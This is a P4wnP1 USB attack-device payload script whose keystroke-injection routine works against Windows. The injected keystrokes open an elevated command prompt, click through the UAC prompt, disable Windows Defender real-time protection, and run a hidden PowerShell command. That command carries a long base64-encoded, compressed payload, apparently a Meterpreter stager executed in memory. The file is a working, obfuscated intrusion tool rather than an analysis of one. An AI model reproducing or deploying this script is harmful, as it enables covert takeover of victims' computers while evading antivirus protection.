# Execute Meterpreter via Powershell in memory

# =============================
# USB setup
# =============================
# Make sure to change USB_PID if you enable different USB functionality in order
# to force Windows to enumerate the device again
USB_VID="0x1d6b"        # Vendor ID
USB_PID="0x0137"        # Product ID

# Overwrite default settings (setup.cfg) for keyboard funtion
USE_RNDIS=true          # if true RNDIS will be enabled
USE_HID=true            # if true HID (keyboard) will be enabled

# ==========================
# Network and DHCP options
# ==========================

# We choose an IP with a very small subnet (see comments in README.rst)
IF_IP="172.16.0.1" # IP used by P4wnP1
IF_MASK="255.255.255.252" 
IF_DHCP_RANGE="172.16.0.2,172.16.0.3" # DHCP Server IP Rang


# =====================
# Keyboard config
# =====================
# Keyboard language for outhid and duckhid commands
lang="us"
USE_HID_TEST=false

# Payload configuration via HID interface

function onNetworkUp()
{
	echo "Network up"
	echo "Active device $active_interface"
	echo "P4wnP1 IP $IF_IP"
	echo "P4wnP1 netmask $IF_MASK"
	echo "Network is running"

	cd /home/pi/P4wnP1/webserver
	php -S 0.0.0.0:80 &	
}


function onTargetGotIP()
{
	echo "DHCP Lease given to target"
	echo "Target IP $target_ip"

 	# add DNS entry for google DNS
	echo nameserver 8.8.8.8 > /etc/resolv.conf

	echo "Target got IP $target_ip via DHCP"
}


function onKeyboardUp()
{
        # we need no initial keyboard delay, before starting the DuckyScript
        # if this method gets called, we know the HID keyboard stack is usable

        cat <<- EOF | duckhid
                DELAY 3000
                GUI r
                DELAY 1000
                STRING powershell Start-Process cmd -Verb runAs
                DELAY 1000
                STRING ENTER
                DELAY 1000
                ALT y
                DELAY 1000
                STRING powershell -nop -w hidden "Set-MpPreference -DisableRealtimeMonitoring $true"
                DELAY 1000
                STRING ENTER
                DELAY 1000
                STRING %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAkAHMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwAnAEgANABzAEkAQQBJAEsAUQBRAFYAawBDAEEANwAxAFcAYgBXACsAYgBTAEIARAArAG4ARQByADkARAA2AGkAeQBaAEYAQQBjAEcAegB0AE8AbQBrAGEAcQBkAEkAQQBoAGgAcABqAFUAQgBPAFAAWABXAGgAVwBHAE4AVwB5ADgAZwBBAE4ATABiAE4ATAByAGYANwAvAEIAaAB0AFMANQBKAGwAWAB1AFQAagBxAEUAeABMADcATQB5ADcAUABQAHoATwB5AHcAVABFAE8ASAA0AGkAaABrAHEATgBuAHIAOABsAEoAWAB0AEUAZQBSAHgAbgB4AC8ALwArADYAbwBiADgAZAAyAHcATABDAFYAMQBTAG0AUABPADYAawBiAHEATABjADEAcABrAEoAUABmAFcAMgBsADIASgBQAG0ATgBYAGQAMABCAEUASwBWAFQAWgBaAHAALwBnADMAegBtAFcARgBuAHcAbgByAGQAaQBRAEkAYgBoAC8AUABMAFMAeQBtAE4AWQB4AFQAUwAvAGIAeAArAGgAYQBpAFEASgBDAGgAWQBFAEkAdwBTAGwAbQBQACsAWgBFAFkAKwBpAHQASABKAGwAOABVAGQAYwBpAGoAegBuAGEAbAA4AHEAMQArAFIAYQBHAEcAVABRAGkAeQBUAGIATQBkAEgAegBJAGsAUQB1AHYAbABlAEwAMwBMAHMASABHAFQAZABYAEIATgBNADIAZQByAFgAcgAxAFYAdQBkAHQASwBjADEAKwBYADcAMQBDAFkASgBXAHoAVwB6AGgASwBLAGcANwBoAEoAUwA1AFoAZwBmAFgATwA1AHcAawBLADAAUgBXADkAVwB4AEUAMABkAEoAdABLAFQAMQBFAFEANQBQAFcAMwBVAHIAVABPAHcAbAB1AGcARgByAEQAMABoAEgAMQBJAC8AYwBwAE0AcgBCAE8AZQBDAE4ARQBVADMAagBrAEMAbABPAGwASgB2AFkAQwA3AEIAVgBHAFAAYgBqAHkAQgBGAGMATgAwAFkASgB5AE4AZgBWADgAQwBGAGEASQBiAFkAUwBwAG8AVABVAG0ARAAvAFkAVwBlAEgALwBOAGcAMABwAEQAaABEAHMAVQB4AFIASABhAHgAUABGAEQAOQBoAEIAUwBiADEAcgBoAHkANQBCAHQAMgBnADUAWgAyAC8AUQBwAGoAegAyAFcANQBYAFkAUQB5AFcAUQA2AHQATwBZAHEAMABGAGcAWABnAFMAcQBSADIANQBLADAARgA2ADMAeQB2ADAASwA5AFMAQwBjAEgARAB6AFAAUQB3AHAATQAvAEgAagAvADcAdgAyADcAWgBaAGsAVQBmAGsAdgBTADIAbwBPAHAAcwA5AHEATQBIAHcANgBUAEEAawBaAEgAcwA5ADAAWQBBAFcAaQAyAEgAeQBWADQASgAvACsAWgA0AFcAdQBNAEQAcwA1AHQARwBzAFUAWgBUAEMAdQBEAE8ARQBYAGMAbgBKAG4AbAA0AFoAagBOADUAMAB6AGwATABtAGoAMgByAFkAZgBIAFIAZgBCAFkAZQA5ADEASwBzADEAUQBCAEIAWQArAGUAVAA2AGcAKwBnAE4AWABaAE0ATQBMAHUASABMAFMASwBpAEYAWABpADkAawBvADkAMgAzADYANgBwADIAZAArAHYAdgAxADYAQQBuAGIAUQBFAG8AZQBvAGsANABWADIAZwBKADAAeQB4ADkAaQBYAGcAbwBHAFcAQgBPADMATwBYAGkALwBGAGIAZwBBAGUAVwB5ADAAMgBrAE4AdABCAEIASABrADIAegBjAG0AdABNAGIATgBmADEAZQBRAEEAMAB5AGQAZABNAGMAWABFAFIAYgBIAGcAUQBFAEEAVABRAEEAVwB4ADUAcAA2AEQAMgBjAGUATAByAGEAcQBoAGoAZwBMAGcAYgBEACsAdgBRAGwAeQBXAGsATgBtAG8AbABDADYAeQBPAFMAdQA5ADUAMwBNAFEAcQBrAHIARQBUAHAASQBhADAAMAArAGgAdABKAHcAYQBZAHkASwBiAEkATABmAEcAQwBHAEcAQwBpAHkAMABoAHAAZABGAHUAVwBQADAASgBWADAAOABKAHgAWQA2AGQAMABOAEwAYwBuAFAAcwBiAG4AWQBWAGIASwBRAG8AVABHAHEAYwBPAFIAQgBNAG8ARwBKAGgAcgA1AEcAQwBiADUASQB6AFUAbQBDADUAMgBrAFoAaQBaADIAQwB2AGQAVgAxAC8AawBRADcASQBKAHcAYQBFAEgAbABoADQAZwBIAHIAQwBTADgAMgBEAFMAUABFAGQAaQBRAEgAcQBRAEQAMQB6AGQAUgBGAFEATgAxAGcAUQBGAEkATABrAHIAZQBJAFgAWQBIAHAAUgAzAFUAUwBLADcAMQBMAEkAOQA1AEYAWgBmAGcAVgB2AFcAdwBUADcAcABjADMANQBLAFkAZwA3AEEAUQB0AEIATgBFAHQARQBhAE0AOABRAHgAaABlAHMAagA1ADcAcgBJAHMAZgA4AEMANQArAEEARwBPAFEAUQBtAHgAYQBnAEkARgAxAHQAVwAxADAAegBNAGEARgA0AEwAbABmAHUAcgAzAGoAZQB0AHUAYwAxAFQAdAArAEIAdAB4ADEASgBNAGcAUwBFAGwAagBnAEwAUgBUAHQAQgA1ADIANgBRAHgAOABNAGQAKwBhAE0AaQA0AGMAOQBiAHYAUgBJADgAQwBQAEwASgB5AGEAdwB4AEYAMAB4AHAATwBWAGQAMwBWAGkASwBsAFMAYwB5AEwAagBuAHUAWAA3AEsAbQA2AHEASABzAHcAegBTAC8AYgA2AGwARgA5AGYARAB3AFoAZAB6AGUAeAAwAGgAYgBpAHoAOQBaAGUAQwBtAHEAaAB5AFYAOAB5AE0AcABpAGcANABYAGYAeAB4AHEASQBtAFcAQgBYAHAAWQA2AGgAbAAzAFcAMQBWAHcAeABjAEEAYgBlAHgATgBwAG8ALwBiADkAcwBRAHEATwBwAEoANgBuAGUAdgBBAFYAVgBkADgAUgArAFMAbgB2AGkAYgB3AGkAOQBVAHoAUgBsAHoARQB2AGUASwBiAFIATgBkAHIATgBxAGQAcQA0AEkAQwBKACsATgBGAFYAVAA2AEkANgBlAC8ARAAzADUAawBkAHYAdAA3AG4AZwA3AEUARwA1ADAAVABmAEMAVgBMADYANwBTAGIAQwBrADcALwBWAFcAdQBQADEAMQBkADkAVAByAHkAYgB1ADcAawBjADIATwBTAHkARgBnAEcAUAA3AEkAeQBNAFkAWQArAEcAZwAzAFgANABrAGgAVwBwAHMAWgB3AHIAWAByAEgARwA4ADgAWQA5AGgAcAB0AHgAUgBkAGgAWABjAFgAYgAzAHQAcABzAHcATgBOAHMAYQBnACsAaAArADYAaQBUAGkAMABjAGQANABCAHIARABxAFkAYgBSAFYAUABWAFEANQBnAG0ARwBJAEoAaQBUAGsASgBpAEwAagBTAFMASQBpAHIATwA1AHgAcABsAHEASwBSAGEAcwByAFEAWgBxAHUARABVAFcAYQA5ADMATgBKAHQAMwBHAHAANgBHAE8AMABUAG8AUwBEAEYAawBRAEYAQQBLAGwARwB3AGoAMgBwAHQATgBvAGoAaQBMAEYARwBKADQAWgBsAHMAeAB2AE0ANAB2AGYAYgB1AFMANwB4AGsAYgBHADIAbQBaAFYAZgBLADIAcgA4ADMATwB2AHMAVwB6ADMARwAwAE4AVABEAGIAdQAyAEwAdwBMAGUAVABHAHUAdgBzAEgAWQBNAGUANABFADkANQBDAGYATAB4AGoARABuAHIAeQBPAEgAagBjAGQAdwBUAE8AeQArADEASQB6AEkAbwB0AEcAMABjAE8AZQBqAEsASwBvAFkAYQBUAGUANgBRACsANQBGAE8ARABQAFkATwBEAE0AVwBrAGQAUgB5AC8AQwBWAGcAVQByADAATAB3AHgAdABIAFkAYwB0AGUAZwBkADIAUgBKAHcAQQA2AE8AQgAvAEUAZQBhAG0AcABvAEMATwBtAEIASwArAHMANAAzAEYAdQBTADkAdgB3AGcAYgBiAGwAYwA1AHkAQgBkAGcASABZAFcAZwBVAEcAZwBZAGIAcQB1AEEASAA0AGgARwA3AEgAbABNAEkAcgBVAHgAMgAzAFgASwBTAEkAagBXAFAAbgA4ADQAYwA4AGUAeQBGADkASwA4ADQAMABIAHQAdwBmAEoATwBOAHIAagBVAG0AMwA0ADgAUwAzAEMAUwBRAHAAOQBKAHYAeQBCAGwARwBpAFcAQwBtADYAUgBqAC8AQwB1AFEAYgBMAFAAdgB1AGwAVwBLAEUANABSAEEAUgBhAE0ARABUAHAAcwB2AFEARQBRAGkASQBuADcAMgBYAFAAKwBnAHoAMAAwADMAMgBYAG0AOABPAEYAWQBzAEgAdwB0AFAAWABpAGkARwBPAGUAQgBMAG0AZgBuAGEANQBjAHUAcgB5AGMAQQBtAHEAbwA2AEsATABLADYAagAwAFUAZQB0AFMAdgA4AGQAdABUAG4AbwBjAHUAeABXAC8AYgBQAEoAegA4ADcAWQBlAFYAbwBuAFgARwBsAHQAWgBxAGUAYQBQAGIATQAzAGIAZwBnAHUAeABjAGMASABtAFIAVgAwAGcAWABuAGIAYQA5AGMAegAyAG0AeQBQAHAALwBTAEMAMgB1AEcAaAA4ACsANwBsAHQASgAvAGIAbgAyAG0AOQAwADMARQBjADMAWABDAGoAcAArAFcAWAArACsAOABJADgANAAvADkAZABjAGoARwB4AE0AUQBjAE8ARQBtADUATwBnAGYAWQB2AC8AUABTAFYARgBTAGgAMwA4AE0AUgAwAEcARQBMAEoAbQBXAFQAegA1ADMAKwB1AFgAbABKADcAYwB3AEEALwBWAFgAOQBnAFMAeQBmAFkAOQBDAHcAQQBBACcAJwApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwAnADsAJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAPQAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1AGUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA== 
                DELAY 1000
                ENTER
                DELAY 500
EOF
}
